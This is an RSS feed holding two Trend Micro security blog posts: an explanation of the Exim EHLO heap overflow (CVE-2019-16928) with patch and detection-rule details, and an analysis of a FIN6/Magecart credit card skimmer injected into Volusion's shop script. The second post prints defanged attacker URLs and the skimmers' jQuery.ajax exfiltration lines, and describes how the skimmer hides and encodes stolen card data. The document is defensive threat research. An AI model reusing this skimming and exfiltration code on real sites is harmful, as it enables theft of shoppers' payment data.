<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" media="screen" href="/~d/styles/rss2full.xsl"?><?xml-stylesheet type="text/css" media="screen" href="http://feeds.trendmicro.com/~d/styles/itemcontent.css"?><rss xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" xmlns:slash="http://purl.org/rss/1.0/modules/slash/" xmlns:creativeCommons="http://backend.userland.com/creativeCommonsRssModule" xmlns:feedburner="http://rssnamespace.org/feedburner/ext/1.0" version="2.0">

<channel>
	<title />
	
	<link>https://blog.trendmicro.com/trendlabs-security-intelligence</link>
	<description />
	<lastBuildDate>
	Mon, 14 Oct 2019 09:57:03 +0000	</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	
	<atom10:link xmlns:atom10="http://www.w3.org/2005/Atom" rel="self" type="application/rss+xml" href="http://feeds.trendmicro.com/Anti-MalwareBlog" /><feedburner:info uri="anti-malwareblog" /><atom10:link xmlns:atom10="http://www.w3.org/2005/Atom" rel="hub" href="http://pubsubhubbub.appspot.com/" /><creativeCommons:license>http://creativecommons.org/licenses/by-nc-sa/2.0/</creativeCommons:license><xhtml:meta xmlns:xhtml="http://www.w3.org/1999/xhtml" name="robots" content="noindex" /><feedburner:emailServiceId>Anti-MalwareBlog</feedburner:emailServiceId><feedburner:feedburnerHostname>https://feedburner.google.com</feedburner:feedburnerHostname><feedburner:feedFlare href="http://www.plusmo.com/add?url=http%3A%2F%2Ffeeds.trendmicro.com%2FAnti-MalwareBlog" src="http://plusmo.com/res/graphics/fbplusmo.gif">Subscribe with Plusmo</feedburner:feedFlare><feedburner:feedFlare href="http://www.thefreedictionary.com/_/hp/AddRSS.aspx?http%3A%2F%2Ffeeds.trendmicro.com%2FAnti-MalwareBlog" src="http://img.tfd.com/hp/addToTheFreeDictionary.gif">Subscribe with The Free Dictionary</feedburner:feedFlare><feedburner:feedFlare href="http://www.bitty.com/manual/?contenttype=rssfeed&amp;contentvalue=http%3A%2F%2Ffeeds.trendmicro.com%2FAnti-MalwareBlog" src="http://www.bitty.com/img/bittychicklet_91x17.gif">Subscribe with Bitty Browser</feedburner:feedFlare><feedburner:feedFlare href="http://www.newsalloy.com/?rss=http%3A%2F%2Ffeeds.trendmicro.com%2FAnti-MalwareBlog" src="http://www.newsalloy.com/subrss3.gif">Subscribe with NewsAlloy</feedburner:feedFlare><feedburner:feedFlare href="http://www.live.com/?add=http%3A%2F%2Ffeeds.trendmicro.com%2FAnti-MalwareBlog" src="http://tkfiles.storage.msn.com/x1piYkpqHC_35nIp1gLE68-wvzLZO8iXl_JMledmJQXP-XTBOLfmQv4zhj4MhcWEJh_GtoBIiAl1Mjh-ndp9k47If7hTaFno0mxW9_i3p_5qQw">Subscribe with Live.com</feedburner:feedFlare><feedburner:feedFlare href="http://mix.excite.eu/add?feedurl=http%3A%2F%2Ffeeds.trendmicro.com%2FAnti-MalwareBlog" src="http://image.excite.co.uk/mix/addtomix.gif">Subscribe with Excite MIX</feedburner:feedFlare><feedburner:feedFlare href="http://www.yourminis.com/subscribe.aspx?u=http%3A%2F%2Ffeeds.trendmicro.com%2FAnti-MalwareBlog" src="http://www.yourminis.com/images/addtoyourminisbadge.gif">Subscribe with Yourminis.com</feedburner:feedFlare><feedburner:feedFlare href="http://download.attensa.com/app/get_attensa.html?feedurl=http%3A%2F%2Ffeeds.trendmicro.com%2FAnti-MalwareBlog" src="http://www.attensa.com/blogs/attensa/WindowsLiveWriter/BadgeredintoBadges_10C02/attensa_feed_button5.gif">Subscribe with Attensa for Outlook</feedburner:feedFlare><feedburner:feedFlare href="http://www.webwag.com/wwgthis.php?url=http%3A%2F%2Ffeeds.trendmicro.com%2FAnti-MalwareBlog" src="http://www.webwag.com/images/wwgthis.gif">Subscribe with Webwag</feedburner:feedFlare><feedburner:feedFlare href="http://hub.netomat.net/account/account.autoSubscribe.jspa?urls=http%3A%2F%2Ffeeds.trendmicro.com%2FAnti-MalwareBlog" src="http://www.netomat.net/blogger/images/icon_netomat_feedbutton.gif">Subscribe with netomat Hub</feedburner:feedFlare><feedburner:feedFlare href="http://www.podcastready.com/oneclick_bookmark.php?url=http%3A%2F%2Ffeeds.trendmicro.com%2FAnti-MalwareBlog" src="http://www.podcastready.com/images/podcastready_button.gif">Subscribe with Podcast Ready</feedburner:feedFlare><feedburner:feedFlare href="http://www.flurry.com/pushRssFeed.do?r=fb&amp;url=http%3A%2F%2Ffeeds.trendmicro.com%2FAnti-MalwareBlog" src="http://www.flurry.com/images/flurry_rss_logo2.gif">Subscribe with Flurry</feedburner:feedFlare><feedburner:feedFlare href="http://www.wikio.com/subscribe?url=http%3A%2F%2Ffeeds.trendmicro.com%2FAnti-MalwareBlog" src="http://www.wikio.com/shared/img/add2wikio.gif">Subscribe with Wikio</feedburner:feedFlare><feedburner:feedFlare href="http://www.dailyrotation.com/index.php?feed=http%3A%2F%2Ffeeds.trendmicro.com%2FAnti-MalwareBlog" src="http://www.dailyrotation.com/rss-dr2.gif">Subscribe with Daily Rotation</feedburner:feedFlare><feedburner:browserFriendly>Follow us on Twitter: http://twitter.com/TrendMicro</feedburner:browserFriendly><item>
		<title>CVE-2019-16928: Exploiting an Exim Vulnerability via EHLO Strings</title>
		<link>http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/I018LVDhP1I/</link>
				<comments>https://blog.trendmicro.com/trendlabs-security-intelligence/cve-2019-16928-exploiting-an-exim-vulnerability-via-ehlo-strings/#respond</comments>
				<pubDate>Thu, 10 Oct 2019 13:00:01 +0000</pubDate>
		<dc:creator><![CDATA[Trend Micro]]></dc:creator>
				<category><![CDATA[Vulnerabilities]]></category>
		<category><![CDATA[DevOps]]></category>

		<guid isPermaLink="false">https://blog.trendmicro.com/trendlabs-security-intelligence/?p=86152</guid>
				<description><![CDATA[<img width="200" height="200" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05-200x200.jpg" class="webfeedsFeaturedVisual wp-post-image" alt="" style="float: left; margin-right: 5px;" link_thumbnail="" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05-200x200.jpg 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05-380x380.jpg 380w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05-300x300.jpg 300w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05.jpg 400w" sizes="(max-width: 200px) 100vw, 200px" /><p>In September, security researchers discovered the existence of CVE-2019-16928, a vulnerability involving the mail transfer agent Exim. Exim accounts for over 50% of publicly reachable mail servers on the internet. What makes the bug particularly noteworthy is that threat actors could exploit it to perform denial of service (DoS) or possibly even remote code execution attacks (RCE) — making it a serious concern for Exim customers who use vulnerable versions of the software.</p>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/cve-2019-16928-exploiting-an-exim-vulnerability-via-ehlo-strings/">CVE-2019-16928: Exploiting an Exim Vulnerability via EHLO Strings</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
]]></description>
								<content:encoded><![CDATA[<img width="200" height="200" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05-200x200.jpg" class="webfeedsFeaturedVisual wp-post-image" alt="" style="float: left; margin-right: 5px;" link_thumbnail="" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05-200x200.jpg 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05-380x380.jpg 380w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05-300x300.jpg 300w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05.jpg 400w" sizes="(max-width: 200px) 100vw, 200px" /><p><em><strong>by Ashish Verma</strong></em></p>
<p>In September, security researchers from the QAX-A-Team discovered the existence of CVE-2019-16928, a <a href="https://www.trendmicro.com/vinfo/hk-en/security/news/cybercrime-and-digital-threats/exim-vulnerability-cve-2019-16928-could-lead-to-denial-of-service-and-remote-code-execution-attacks">vulnerability involving the mail transfer agent Exim</a>. Exim accounts for <a href="http://www.securityspace.com/s_survey/data/man.201909/mxsurvey.html">over 50%</a> of publicly reachable mail servers on the internet. What makes the bug particularly noteworthy is that threat actors could exploit it to perform denial of service (DoS) or possibly even remote code execution attacks (RCE) — making it a serious concern for Exim customers who use vulnerable versions of the software.</p>
<p>The flaw exists in the following Exim versions (earlier versions are not affected):</p>
<ul>
<li>4.92</li>
<li>4.92.1</li>
<li>4.92.2.</li>
</ul>
<p>In this entry, we explain how CVE-2019-16928 can be exploited, specifically, how introducing a heap-based buffer overflow error to the Exim process can be used to gain execution control of it.</p>
<h3><strong>The heap overflow</strong></h3>
<p>During execution in computer memory, local variables are stored in an area of the memory called the stack, which is responsible for storing local variables created by a function. On the other hand, dynamic variables, which are used to allocate and free memory during runtime, are stored in another area of the memory called the heap.</p>
<p>Each local variable points to its value in the heap, which basically means that it points to its memory address containing the value. When a string longer than the dedicated memory is used as an input, it overrides and changes the value in subsequent memory blocks in the heap. Figure 1 depicts this execution flow.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Exim-Vulnerability-01.jpg"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Exim-Vulnerability-01.jpg" alt="Figure 1. Memory representation during heap buffer overflow" width="500" /></a></p>
<p align="center">Figure 1. Memory representation during heap buffer overflow</p>
<p>In this scenario, <em>Value 2</em> can be any string or backdoor command which can be executed during runtime — a process widely known as remote code execution.</p>
<h3><strong>Using EHLO strings to exploit the vulnerability</strong></h3>
<p>As defined by the Internet Engineering Task Force (IETF), the Extended HELO (EHLO) is a command sent by the email client to identify itself and inform the email server that it will use Extended Simple Mail Transfer Protocol (ESMTP) before starting the process of sending an email. It is through EHLO strings that a threat actor could exploit CVE-2019-16928 to perform malicious attacks, such as crashing the Exim process (resulting in DoS). Furthermore, a backdoor command used as an input for EHLO could lead to remote code execution.</p>
<p>This vulnerability is found in the method string_vformat() in string.c. Due to a coding error, the length of the string was not growing by enough, leading to a buffer overflow anomaly. The growth of the string is fixed by <a href="https://git.exim.org/exim.git/blobdiff/bcbca153505de435c881e71297fde83c3ac02cc1..478effbfd9c3cc5a627fc671d4bf94d13670d65f:/src/src/string.c">adding size from the offset value</a>.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Exim-Vulnerability-02.jpg"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Exim-Vulnerability-02.jpg" alt=" Figure 2. gstring_grow() invocation which allocates more memory to string" width="500" /></a></p>
<p align="center">Figure 2. gstring_grow() invocation which allocates more memory to string</p>
<p>As seen in Figure 2, the statement highlighted in red is the flaw in the code. If the difference between g-&gt;ptr (the current pointer in string or offset) and (lim &#8211; g-&gt;ptr) is unreasonably low and the size of the appended string is larger than the allocated memory, then it can lead to heap overflow. A simple fix is found in the next statement.</p>
<h3><strong>Recommendations and Trend Micro solutions</strong></h3>
<p>As of the time of writing, Exim has already released an update (version <a href="https://ftp.exim.org/pub/exim/exim4/">4.92.3</a>) that includes fixes for CVE-2019-16928. To prevent any possible issues that might arise from the exploitation of the vulnerability, Exim users should update their software to the latest version.</p>
<p>To strengthen overall security posture further, organizations can also look into security software such as the <a href="https://www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/">Trend Micro</a><img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> <a href="https://www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/">Deep Discovery</a><img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> solution, which provides detection and in-depth analysis through specialized engines, custom <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/deploying-a-smart-sandbox-for-unknown-threats-and-zero-day-attacks/">sandboxing</a>, and seamless correlation across the entire attack life cycle, allowing it to detect vulnerability-exploiting attacks even without engine or pattern updates.</p>
<p>This technology also includes the Trend Micro <a href="https://www.trendmicro.com/en_ca/business/products/network/deep-discovery/inspector.html">Deep Discovery Inspector</a>, which protects customers from attacks that exploit CVE-2019-16928 via the following rule:</p>
<ul>
<li>Rule ID 4246: Possible CVE-2019-16928 &#8211; Exim Buffer Overflow Exploit &#8211; SMTP (Request)</li>
</ul>
<p>The <a href="https://www.trendmicro.com/en_us/business/products/hybrid-cloud.html">Trend Micro<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Deep Security<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /></a>  solution also protect systems and users from threats targeting CVE-2019-16928 via the following Deep Packet Inspection (DPI) rule:</p>
<ul>
<li>1010010 &#8211; Exim Remote Code Execution Vulnerability (CVE-2019-16928)</li>
</ul>
<p><a href="https://www.trendmicro.com/en_us/business/products/network/intrusion-prevention/tipping-point-threat-protection-system.html">Trend Micro<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> TippingPoint®</a> customers are protected from threats and attacks that may exploit this vulnerability via the following <a href="https://www.trendmicro.com/en_us/business/products/network/intrusion-prevention/threat-intelligence.html">MainlineDV</a> filter:</p>
<ul>
<li>36283: SMTP: Exim Buffer Overflow Vulnerability</li>
</ul>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/cve-2019-16928-exploiting-an-exim-vulnerability-via-ehlo-strings/">CVE-2019-16928: Exploiting an Exim Vulnerability via EHLO Strings</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
<div class="feedflare">
<a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=I018LVDhP1I:CL8q0t0hThE:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=I018LVDhP1I:CL8q0t0hThE:F7zBnMyn0Lo"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=I018LVDhP1I:CL8q0t0hThE:F7zBnMyn0Lo" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=I018LVDhP1I:CL8q0t0hThE:qj6IDK7rITs"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=I018LVDhP1I:CL8q0t0hThE:V_sGLiPBpWU"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=I018LVDhP1I:CL8q0t0hThE:V_sGLiPBpWU" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=I018LVDhP1I:CL8q0t0hThE:l6gmwiTKsz0"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=I018LVDhP1I:CL8q0t0hThE:gIN9vFwOqvQ"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=I018LVDhP1I:CL8q0t0hThE:gIN9vFwOqvQ" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=I018LVDhP1I:CL8q0t0hThE:TzevzKxY174"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174" border="0"></img></a>
</div><img src="http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/I018LVDhP1I" height="1" width="1" alt=""/>]]></content:encoded>
							<wfw:commentRss>https://blog.trendmicro.com/trendlabs-security-intelligence/cve-2019-16928-exploiting-an-exim-vulnerability-via-ehlo-strings/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
							<feedburner:origLink>https://blog.trendmicro.com/trendlabs-security-intelligence/cve-2019-16928-exploiting-an-exim-vulnerability-via-ehlo-strings/</feedburner:origLink></item>
		<item>
		<title>FIN6 Compromised E-commerce Platform via Magecart to Inject Credit Card Skimmers Into Thousands of Online Shops</title>
		<link>http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/PRN9qN2jHBg/</link>
				<comments>https://blog.trendmicro.com/trendlabs-security-intelligence/fin6-compromised-e-commerce-platform-via-magecart-to-inject-credit-card-skimmers-into-thousands-of-online-shops/#respond</comments>
				<pubDate>Thu, 10 Oct 2019 01:18:43 +0000</pubDate>
		<dc:creator><![CDATA[Joseph C Chen (Fraud Researcher)]]></dc:creator>
				<category><![CDATA[Bad Sites]]></category>
		<category><![CDATA[Malware]]></category>
		<category><![CDATA[credit card]]></category>
		<category><![CDATA[ecommerce]]></category>
		<category><![CDATA[FIN6]]></category>
		<category><![CDATA[Magecart]]></category>
		<category><![CDATA[Skimmer]]></category>

		<guid isPermaLink="false">https://blog.trendmicro.com/trendlabs-security-intelligence/?p=86168</guid>
				<description><![CDATA[<img width="200" height="125" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg" class="webfeedsFeaturedVisual wp-post-image" alt="" style="float: left; margin-right: 5px;" link_thumbnail="" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-768x480.jpg 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-1024x640.jpg 1024w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-640x400.jpg 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-900x563.jpg 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-440x275.jpg 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-380x238.jpg 380w" sizes="(max-width: 200px) 100vw, 200px" /><p>We discovered that the online credit card skimming attack known as Magecart or E-Skimming was actively operating on 3,126 online shops.</p>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/fin6-compromised-e-commerce-platform-via-magecart-to-inject-credit-card-skimmers-into-thousands-of-online-shops/">FIN6 Compromised E-commerce Platform via Magecart to Inject Credit Card Skimmers Into Thousands of Online Shops</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
]]></description>
								<content:encoded><![CDATA[<img width="200" height="125" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg" class="webfeedsFeaturedVisual wp-post-image" alt="" style="float: left; margin-right: 5px;" link_thumbnail="" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-768x480.jpg 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-1024x640.jpg 1024w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-640x400.jpg 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-900x563.jpg 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-440x275.jpg 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-380x238.jpg 380w" sizes="(max-width: 200px) 100vw, 200px" /><p><strong>Updated on October 14, 2019 at 2:50 AM PST to add a statement from Volusion.</strong></p>
<p>We discovered that the online credit card skimming attack known as <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/new-magecart-attack-delivered-through-compromised-advertising-supply-chain/" target="_blank" rel="noopener noreferrer">Magecart</a> or <a href="https://niccs.us-cert.gov/sites/default/files/documents/pdf/ncsam_eskimming_508.pdf?trackDocs=ncsam_eskimming_508.pdf" target="_blank" rel="noopener noreferrer">E-Skimming</a> was actively operating on 3,126 online shops. Our data shows that the attack started on September 7, 2019. All of the impacted online shops are hosted on the cloud platform of the e-commerce service provider “Volusion,” one of the <a href="https://www.ecommerceceo.com/ecommerce-platforms/" target="_blank" rel="noopener noreferrer">top e-commerce platforms</a> in the market. This is actually the third time we have identified a card skimmer injected into the cloud platform of an e-commerce provider. Two other businesses were already victimized this year: a <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/mirrorthief-group-uses-magecart-skimming-attack-to-hit-hundreds-of-campus-online-stores-in-us-and-canada/" target="_blank" rel="noopener noreferrer">campus</a> e-commerce platform and a <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/magecart-skimming-attack-targets-mobile-users-of-hotel-chain-booking-websites/" target="_blank" rel="noopener noreferrer">hotel</a> e-commerce platform. These targets are obviously appealing to cybercriminals since they are connected to multiple — in this most recent case, thousands of — online shops.</p>
<p>We found malicious code injected into a JavaScript library provided by Volusion to their client shops. The injected code loaded another JavaScript stored on a <a href="https://cloud.google.com/storage/" target="_blank" rel="noopener noreferrer">Google Storage</a> service. The loaded script is almost a direct copy of a normal JavaScript library but has a credit card skimmer carefully integrated. When customers submit their payment information, the skimmer will copy and send the personal information and credit card details to an exfiltration server belonging to the attackers.</p>
<p>Our team contacted Google and they have removed the file. The attack is currently offline. As of publication, Volusion has <a href="https://twitter.com/Volusion/status/1181652914340798467" target="_blank" rel="noopener noreferrer">acknowledged</a> and <a href="https://twitter.com/Volusion/status/1181661671674335232?s=20" target="_blank" rel="noopener noreferrer">fixed the issue</a>.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-1.jpg"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-1.jpg" alt="Figure. 1" width="600" /></a></p>
<p style="text-align: center">Figure 1. Online credit card skimming attack chain</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-2.jpg"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-2.jpg" alt="Figure. 2" width="600" /></a></p>
<p style="text-align: center">Figure 2. Country distribution of online shop users who accessed the card skimmer (based on data from the Trend Micro<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Smart Protection Network<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> infrastructure)</p>
<p>During our investigation, we found that the attackers seemed more experienced and thoughtful than many other skimmer groups. They did not simply add their malicious code at the top or end of a script; instead, they carefully integrated the code into the original script to be part of the execution flow of the program. The code was also written as simply as possible, making it difficult to be identified in a big library. Furthermore, they registered the domain of their exfiltration server in a similar style to a legitimate Volusion domain.</p>
<p>Considering the modus operandi, we believe the attackers are from Magecart Group 6, which has also been <a href="https://twitter.com/ydklijnsma/status/1167837317232377856" target="_blank" rel="noopener noreferrer">identified</a> as the notorious threat actor <a href="https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/" target="_blank" rel="noopener noreferrer">FIN6</a>. We found similarities in the code used in this attack and the code used in FIN6’s previous attacks on <a href="https://www.riskiq.com/blog/labs/magecart-british-airways-breach/" target="_blank" rel="noopener noreferrer">British Airways</a> and <a href="https://www.riskiq.com/blog/labs/magecart-newegg/" target="_blank" rel="noopener noreferrer">Newegg</a>.</p>
<p><em><strong>Analysis of the code injection</strong></em></p>
<p>The attackers injected their code into a library provided on Volusion’s e-commerce platform for their client shops. The script, described by the comments on the library, includes the necessary code for the pop-out feature of the shop’s navigation menu. It was also used on the shop checkout page. The script is located at:</p>
<p>• hxxps://[online shop domain]/a/j/vnav.js</p>
<p>The attackers didn’t just inject their code inside the library. They also integrated their code into the original function of <a href="https://jqueryui.com/" target="_blank" rel="noopener noreferrer">jQueryUI</a> code to be executed with the original execution flow. They created a new object “e.widget.unbridge” right before the original object “e.widget.bridge” and the malicious code is inside the new object. It’s worth noting that the attackers even wrote their malicious code in a similar coding style to make it look more like a part of the original source code.</p>
<p>The injected object will create a new script element to load another remote script stored on Google Storage.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-3.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-3.png" alt="Figure. 3" width="700" /></a></p>
<p style="text-align: center">Figure 3. Malicious script injected into Volusion’s JavaScript library</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-4.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-4.png" alt="Figure. 4" width="700" /></a></p>
<p style="text-align: center">Figure 4. Comparison of the original Volusion script (left) and the script with injection (right); the injected malicious code is highlighted</p>
<p style="text-align: left"><strong>Analysis of the credit card skimmer</strong></p>
<p>The loaded remote script is on Google Storage:</p>
<p>• hxxps[:]//storage[.]googleapis[.]com/volusionapi/resources.js</p>
<p>Much of the code inside the script is from the library “<a href="https://cdnjs.cloudflare.com/ajax/libs/js-cookie/2.2.1/js.cookie.js" target="_blank" rel="noopener noreferrer">js-cookie</a>” version 2.2.1. However, the attackers modified it and integrated a credit card skimmer into the original script. The skimmer binds at the events <a href="https://api.jquery.com/mousedown/" target="_blank" rel="noopener noreferrer">“mousedown”</a> and <a href="https://www.w3schools.com/jsref/event_touchstart.asp" target="_blank" rel="noopener noreferrer">“touchstart”</a> of the payment submit button.</p>
<p>This means that when victims click (from desktop) or touch (from mobile devices) the submit button, the events will be triggered and the skimmer will be executed.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-5.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-5.png" alt="Figure. 5" width="700" /></a></p>
<p style="text-align: center">Figure 5. Comparison of the JavaScript library injected with the skimmer (left) and the original “js-cookie” library (right)</p>
<p>The skimmer copies the information on the entire payment form: the victim’s name, address, phone number, email address, and credit card details (the number, cardholder name, expiration month, expiration year, and CVV number).</p>
<p>Once the skimmer has the credit card details, it serializes the copied data into a string and encodes it with Base64. Then, it performs a character permutation on the encoded string to make sure it can’t be directly decoded with Base64 decoding.</p>
<p>The data will then be stored in <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage" target="_blank" rel="noopener noreferrer">sessionStorage</a> with the key “__utmz_opt_in_out”. The next time the skimmer is loaded (usually on the page after the payment), it will detect if there is data inside sessionStorage and it will use HTTP POST to send the stolen payment information to a remote server at “hxxps[:]//volusion-cdn[.]com/analytics/beacon” for exfiltration.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-6.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/Fig-6.png" alt="Figure. 6" width="700" /></a></p>
<p style="text-align: center">Figure 6. Main script of the credit card skimmer</p>
<p>Note that the attackers used the domain “volusion-cdn[.]com” for their exfiltration server, a similar name to Volusion’s legitimate server. A possible reason why the attackers stored the skimmer on Google Storage is because Volusion is also running its <a href="https://cloud.google.com/customers/volusion/" target="_blank" rel="noopener noreferrer">service</a> on the Google Cloud Platform.</p>
<p><em><strong>Evidence of Magecart or FIN6</strong></em></p>
<p>As previously mentioned, based on the modus operandi, we believe the attackers are from Magecart Group 6, also known as the threat actor FIN6. Here are the connections we considered:</p>
<ul>
<li>Group 6 is known to only target top-tier victims, investing in scams where they can receive a big payoff from one attack. This single hack of Volusion allows them to receive credit card data from 3,126 online shops.</li>
<li>From the previous skimming attack on the British Airways and Newegg websites, we know that Group 6 tried to register the domains of the exfiltration server to be similar to the victims’ domains. In this case, the domain of the exfiltration server is “volusion-cdn[.]com” — very similar to the valid domain “cdn3[.]volusion[.]com” from Volusion. In addition, the exfiltration domains used during the British Airways, Newegg, and Volusion attacks are all registered through <a href="https://www.namecheap.com/" target="_blank" rel="noopener noreferrer">Namecheap</a>.</li>
<li>We found that the skimmer is an improved version of the previous skimmer used in the attacks on British Airways and Newegg. Both old and current skimmers are written with jQuery, serialize the stolen data, and use the jQuery.ajax function to POST data to a remote server. Although the older skimmer is much simpler compared to the current one, it didn’t encode the stolen data or store the data in sessionStorage before the exfiltration.</li>
</ul>
<table>
<tbody>
<tr>
<td width="112"><strong>Target</strong></td>
<td width="440"><strong>Script of data exfiltration request</strong></td>
</tr>
<tr>
<td width="112">British Airways</td>
<td width="440">jQuery.ajax({type:&#8221;POST&#8221;,async:0,url:”[exfiltration url]”,data:t,dataType:&#8221;application/json})</td>
</tr>
<tr>
<td width="112">Newegg</td>
<td width="440">jQuery.ajax({type:&#8221;POST&#8221;,async:true,url:”[exfiltration url]”,data:pdati,dataType:&#8221;application/json})</td>
</tr>
<tr>
<td width="112">Volusion</td>
<td width="440">$.ajax({type: &#8216;POST&#8217;,url: &#8216;[exfiltration url]&#8217;,dataType: &#8216;application/x-www-form-urlencoded&#8217;,data: d,complete: function() { window.sessionStorage.removeItem(&#8216;__utmz_opt_in_out&#8217;); }})</td>
</tr>
</tbody>
</table>
